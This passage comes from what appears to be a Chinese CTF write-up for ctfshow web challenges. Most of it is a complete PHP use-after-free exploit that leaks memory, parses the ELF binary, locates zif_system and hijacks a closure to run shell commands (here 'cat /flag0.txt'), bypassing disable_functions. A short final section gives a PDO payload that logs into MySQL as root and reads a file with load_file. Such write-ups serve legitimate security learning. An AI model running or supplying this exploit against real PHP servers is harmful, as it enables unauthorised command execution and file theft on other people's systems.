        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$ptr</span> <span class="token operator">&gt;</span><span class="token operator">&gt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$v</span> <span class="token operator">&gt;</span><span class="token operator">&gt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$leak</span> <span class="token operator">%</span><span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>
            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>
                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>

            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>

            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>
        <span class="token keyword">do</span> <span class="token punctuation">{</span>
            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$addr</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$vuln</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>
    <span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>

    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web75-76"><a href="#web75-76" class="headerlink" title="web75 -76"></a>web75 -76</h2><p>彳亍！文件名知道，我怎么也想不到是用MySQL读取，这还是黑盒，，，，</p>
<p>hint：<code>c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh-&gt;query('select load_file("/flag36.txt")') as $row){echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0);</code></p>
